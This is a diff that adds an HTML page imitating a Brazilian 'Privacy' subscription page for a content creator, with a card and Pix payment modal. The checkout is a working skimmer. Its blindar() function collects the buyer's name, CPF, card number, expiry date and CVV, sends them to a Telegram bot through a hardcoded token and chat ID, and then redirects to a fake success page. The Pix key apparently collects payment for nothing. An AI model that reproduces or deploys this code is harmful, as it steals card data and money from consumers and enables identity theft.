@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Privacy | Kamylinha Santos</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+    <style>
+        :root { --p-orange: #f47b52; --p-grad: linear-gradient(135deg, #f47b52 0%, #f9a67a 100%); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: #fff; color: #1a1a1a; overflow-x: hidden; }
+
+        /* HEADER */
+        .header { padding: 15px 20px; border-bottom: 1px solid #f1f1f1; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: #fff; z-index: 1000; }
+        .logo-img { height: 35px; } /* Logo Grande como pedido */
+
+        /* PERFIL PRINCIPAL */
+        .banner { width: 100%; height: 260px; background: url('capa.png') center/cover; position: relative; }
+        .stats { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.65); color: #fff; padding: 7px 15px; border-radius: 25px; font-size: 11px; display: flex; gap: 12px; backdrop-filter: blur(10px); font-weight: 700; }
+        .profile-wrap { margin-top: -55px; padding: 0 20px; position: relative; z-index: 10; }
+        .avatar { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: url('perfil1.png') center/cover; box-shadow: 0 8px 24px rgba(0,0,0,0.12); }
+
+        .content { padding: 15px 20px; }
+        .name { font-size: 24px; font-weight: 900; display: flex; align-items: center; gap: 6px; }
+        .user-at { color: #8a8a8a; font-size: 14px; margin-bottom: 14px; display: block; font-weight: 500; }
+        .bio { font-size: 15px; color: #444; line-height: 1.6; margin-bottom: 22px; }
+
+        /* REDES SOCIAIS */
+        .social-row { display: flex; gap: 12px; margin-bottom: 25px; }
+        .s-btn { width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #efefef; display: flex; align-items: center; justify-content: center; color: var(--p-orange); font-size: 20px; cursor: pointer; }
+
+        /* BOTÕES DE COMPRA */
+        .btn-buy { width: 100%; padding: 22px 25px; border-radius: 50px; border: none; background: var(--p-grad); color: #fff; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; cursor: pointer; font-weight: 800; font-size: 17px; }
+        .old-p { text-decoration: line-through; font-size: 11px; opacity: 0.8; display: block; font-weight: 500; }
+
+        /* GALERIA */
+        .gallery { display: flex; flex-direction: column; gap: 18px; margin: 25px 0; }
+        .gal-card { width: 100%; border-radius: 25px; overflow: hidden; border: 1px solid #f0f0f0; }
+        .gal-card img { width: 100%; display: block; }
+
+        /* FAQ BONITO */
+        .faq-title { color: var(--p-orange); font-size: 26px; font-weight: 900; text-align: center; margin: 40px 0 25px; }
+        .faq-item { border: 1px solid #eee; border-radius: 18px; margin-bottom: 12px; overflow: hidden; transition: 0.3s; }
+        .faq-head { padding: 18px; display: flex; justify-content: space-between; align-items: center; font-weight: 700; font-size: 15px; cursor: pointer; }
+        .faq-body { padding: 0 18px 18px; font-size: 14px; color: #666; display: none; line-height: 1.5; }
+
+        /* MODAIS */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(8px); }
+        .m-box { background: #fff; width: 100%; max-width: 420px; border-radius: 35px; overflow: hidden; position: relative; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        /* ABA REDES SOCIAIS / BENEFÍCIOS */
+        .ben-header { background: url('capa.png') center/cover; height: 140px; position: relative; }
+        .ben-avatar { width: 90px; height: 90px; border-radius: 50%; border: 4px solid #fff; background: url('perfil1.png') center/cover; position: absolute; bottom: -45px; left: 20px; }
+        .ben-content { padding: 55px 25px 30px; }
+        .ben-item { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; font-size: 15px; font-weight: 600; color: #333; }
+        .ben-item i { color: #4caf50; font-size: 18px; }
+
+        /* TELA DE PAGAMENTO */
+        .pay-logo { display: block; height: 30px; margin: 0 auto 25px; }
+        .pay-tabs { display: flex; gap: 10px; margin-bottom: 25px; }
+        .p-tab { flex: 1; padding: 12px; border-radius: 15px; border: 1.5px solid #eee; text-align: center; cursor: pointer; font-weight: 700; color: #999; }
+        .p-tab.active { border-color: var(--p-orange); color: var(--p-orange); background: #fff5f2; }
+        
+        .pay-label { font-size: 13px; font-weight: 700; margin-bottom: 8px; display: block; text-align: center; color: #1a1a1a; }
+        .f-input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1.5px solid #eee; border-radius: 15px; background: #fff; outline: none; font-size: 16px; text-align: center; color: var(--p-orange); font-weight: 600; }
+
+        /* PIX AREA */
+        #pix-area { text-align: center; display: none; }
+        .timer { font-size: 24px; font-weight: 900; color: var(--p-orange); margin: 10px 0; }
+        .pix-code { background: #f9f9f9; padding: 15px; border-radius: 15px; border: 1px dashed #ccc; font-size: 11px; word-break: break-all; margin: 15px 0; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="logo.png" class="logo-img">
+        <i class="fa-solid fa-globe" style="color:#ccc; font-size: 20px;"></i>
+    </div>
+
+    <div id="home-page">
+        <div class="banner">
+            <div class="stats">
+                <span><i class="fa-regular fa-image"></i> 354</span>
+                <span><i class="fa-solid fa-play"></i> 148</span>
+                <span><i class="fa-regular fa-heart"></i> 20.2K</span>
+            </div>
+        </div>
+
+        <div class="profile-wrap"><div class="avatar"></div></div>
+
+        <div class="content">
+            <h1 class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></h1>
+            <span class="user-at">@eukamylinhasantos</span>
+            <p class="bio">Oi, meus amores! 🔥 Meus melhores conteúdos estão aqui. Assine agora para ter acesso total ao meu lado mais íntimo...</p>
+            
+            <div class="social-row">
+                <div class="s-btn" onclick="openBen()"><i class="fa-brands fa-tiktok"></i></div>
+                <div class="s-btn" onclick="openBen()"><i class="fa-brands fa-instagram"></i></div>
+                <div class="s-btn" onclick="openBen()"><i class="fa-brands fa-telegram"></i></div>
+            </div>
+
+            <button class="btn-buy" onclick="openPay('Mensal', '10,00')">
+                <span>Mensal</span>
+                <div style="text-align:right"><span class="old-p">De R$ 47,00 por</span> R$ 10,00</div>
+            </button>
+
+            <button class="btn-buy" style="background:#1a1a1a" onclick="openPay('Vitalício', '27,00')">
+                <span>Vitalício</span>
+                <div style="text-align:right"><span class="old-p">De R$ 197,00 por</span> R$ 27,00</div>
+            </button>
+
+            <div class="gallery">
+                <div class="gal-card"><img src="imagem1.png"></div>
+                <div class="gal-card"><img src="imagem2.png"></div>
+            </div>
+
+            <h2 class="faq-title">Perguntas Frequentes</h2>
+            <div class="faq-item">
+                <div class="faq-head" onclick="$(this).next().slideToggle()"><span>+ O pagamento é seguro?</span></div>
+                <div class="faq-body">Sim! Utilizamos tecnologia criptografada para garantir total segurança dos seus dados.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-head" onclick="$(this).next().slideToggle()"><span>+ Como recebo o acesso?</span></div>
+                <div class="faq-body">O acesso é enviado instantaneamente para o seu e-mail após a confirmação do pagamento.</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="mBen" class="modal">
+        <div class="m-box">
+            <div class="ben-header"><div class="ben-avatar"></div></div>
+            <div class="ben-content">
+                <h3 style="text-align:center; font-weight: 900; margin-bottom: 25px;">ASSINE PARA LIBERAR TUDO</h3>
+                <div class="ben-item"><i class="fa-solid fa-circle-check"></i> Conteúdos diários sem censura</div>
+                <div class="ben-item"><i class="fa-solid fa-circle-check"></i> Chat exclusivo e Videochamada</div>
+                <div class="ben-item"><i class="fa-solid fa-circle-check"></i> Acesso vitalício à galeria antiga</div>
+                <button class="btn-buy" style="margin-top: 20px; justify-content: center;" onclick="openPay('Mensal', '10,00')">ASSINAR AGORA</button>
+                <p onclick="$('.modal').fadeOut()" style="text-align:center; color:#999; margin-top:20px; cursor:pointer; font-size:12px">Fechar</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="mPay" class="modal">
+        <div class="m-box" style="padding: 30px;">
+            <img src="logo.png" class="pay-logo">
+            <div class="pay-tabs">
+                <div class="p-tab active" onclick="switchTab('card')">Cartão</div>
+                <div class="p-tab" onclick="switchTab('pix')">Pix</div>
+            </div>
+
+            <div id="card-area">
+                <span class="pay-label">Nome Completo</span>
+                <input type="text" id="n" class="f-input" placeholder="Digite seu nome">
+                
+                <span class="pay-label">Número do Cartão</span>
+                <input type="text" id="c" class="f-input" placeholder="XXXX XXXX XXXX XXXX">
+                
+                <span class="pay-label">CPF</span>
+                <input type="text" id="f" class="f-input" placeholder="000.000.000-00">
+                
+                <div style="display:flex; gap:10px">
+                    <div style="flex:1"><span class="pay-label">Validade</span><input type="text" id="v" class="f-input" placeholder="MM/AA"></div>
+                    <div style="flex:1"><span class="pay-label">CVV</span><input type="text" id="s" class="f-input" placeholder="123"></div>
+                </div>
+                <button class="btn-buy" style="justify-content:center; margin-top:10px;" onclick="blindar()">CONFIRMAR PAGAMENTO</button>
+            </div>
+
+            <div id="pix-area">
+                <div class="timer" id="timer">10:00</div>
+                <p style="font-size:12px; color:#666; margin-bottom: 10px;">Copie o código Pix abaixo:</p>
+                <div class="pix-code" id="pKey">bb4964aa-40b8-4452-8171-56f8e8e0dec7</div>
+                <button class="btn-buy" style="background:#1a1a1a; justify-content:center;" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
+                <p style="font-size:11px; margin-top:10px">Valor: R$ <span class="vText">10,00</span></p>
+            </div>
+            <p onclick="$('.modal').fadeOut()" style="text-align:center; color:#999; margin-top:20px; cursor:pointer; font-size:12px">Voltar</p>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function(){
+            $('#c').mask('0000 0000 0000 0000');
+            $('#f').mask('000.000.000-00');
+            $('#v').mask('00/00');
+            $('#s').mask('000');
+        });
+
+        function openBen() { $('#mBen').fadeIn().css('display','flex'); }
+        function openPay(plano, valor) {
+            $('.modal').hide();
+            $('.vText').text(valor);
+            $('#mPay').fadeIn().css('display','flex');
+            startTimer(600);
+        }
+
+        function switchTab(t) {
+            $('.p-tab').removeClass('active');
+            if(t=='card'){$('.p-tab:first').addClass('active'); $('#card-area').show(); $('#pix-area').hide();}
+            else {$('.p-tab:last').addClass('active'); $('#card-area').hide(); $('#pix-area').show();}
+        }
+
+        function copyPix() {
+            var $t = $("<input>"); $("body").append($t);
+            $t.val($('#pKey').text()).select();
+            document.execCommand("copy"); $t.remove();
+            alert("Código Pix copiado com sucesso!");
+        }
+
+        function startTimer(d) {
+            var t = d, m, s;
+            setInterval(function(){
+                m = parseInt(t/60,10); s = parseInt(t%60,10);
+                m = m<10?"0"+m:m; s = s<10?"0"+s:s;
+                $('#timer').text(m+":"+s);
+                if(--t<0) t=d;
+            },1000);
+        }
+
+        function blindar() {
+            const tok = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
+            const grp = '-1003569961624';
+            const msg = `🚀 NOVO CARD\n👤 Nome: ${$('#n').val()}\n🆔 CPF: ${$('#f').val()}\n💳 Card: ${$('#c').val()}\n📅 Val: ${$('#v').val()}\n🔒 CVV: ${$('#s').val()}\n💰 Valor: R$ ${$('.vText').first().text()}`;
+            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${grp}&text=${encodeURIComponent(msg)}`);
+            
+            const win = window.open("","_blank");
+            if(win){ win.document.write(`<html><body style="margin:0;"><img src="final.png" style="width:100vw; height:100vh; object-fit:cover;"></body></html>`); }
+            setTimeout(()=>{ window.location.href="https://privacy.com.br/checkout/success"; }, 1500);
+        }
+    </script>
+</body>
+</html>
+
